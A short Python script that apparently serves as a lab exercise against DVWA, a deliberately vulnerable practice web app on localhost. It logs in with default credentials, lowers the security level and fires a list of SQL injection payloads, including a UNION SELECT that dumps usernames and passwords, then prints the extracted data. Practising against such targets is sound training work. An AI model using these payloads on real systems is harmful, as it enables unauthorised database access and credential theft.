#!/usr/bin/env python3
"""
Simple direct SQL injection test for DVWA
"""

import requests
from bs4 import BeautifulSoup

def login_and_test():
    # Create session
    session = requests.Session()
    
    # Step 1: Get login page for CSRF token
    print("[*] Getting login page...")
    login_page = session.get("http://localhost/DVWA/login.php")
    soup = BeautifulSoup(login_page.text, 'html.parser')
    
    # Extract CSRF token
    token = soup.find('input', {'name': 'user_token'}).get('value')
    print(f"[*] Found CSRF token: {token}")
    
    # Step 2: Login
    login_data = {
        'username': 'admin',
        'password': 'password',
        'Login': 'Login',
        'user_token': token
    }
    
    print("[*] Logging in...")
    response = session.post("http://localhost/DVWA/login.php", data=login_data)
    
    if 'index.php' in response.url:
        print("[+] Login successful!")
    else:
        print("[-] Login failed")
        return
    
    # Step 3: Set security level to low
    print("[*] Setting security level to low...")
    security_page = session.get("http://localhost/DVWA/security.php")
    soup = BeautifulSoup(security_page.text, 'html.parser')
    token = soup.find('input', {'name': 'user_token'}).get('value')
    
    security_data = {
        'security': 'low',
        'seclev_submit': 'Submit',
        'user_token': token
    }
    session.post("http://localhost/DVWA/security.php", data=security_data)
    
    # Step 4: Test SQL injection
    print("\n[*] Testing SQL injection on /vulnerabilities/sqli/")
    
    # Test payloads
    payloads = [
        "1' OR '1'='1",
        "' OR 1=1 --",
        "1' AND '1'='1",
        "1' ORDER BY 1--",
        "1' UNION SELECT user,password FROM users--",
    ]
    
    for payload in payloads:
        url = f"http://localhost/DVWA/vulnerabilities/sqli/?id={payload}&Submit=Submit"
        print(f"\n[*] Trying: {payload}")
        
        response = session.get(url)
        
        # Check for successful injection
        if "First name:" in response.text and "Surname:" in response.text:
            print("[VULNERABLE] SQL Injection detected!")
            
            # Extract the data
            soup = BeautifulSoup(response.text, 'html.parser')
            pre_tags = soup.find_all('pre')
            for pre in pre_tags:
                print(f"  Data: {pre.text}")
            
            # Also look for user data
            if "admin" in response.text:
                print("  Found admin user data!")
        elif "Mysql" in response.text or "mysql" in response.text.lower():
            print("[VULNERABLE] SQL Error detected!")
        else:
            print("  No injection detected")

if __name__ == "__main__":
    login_and_test()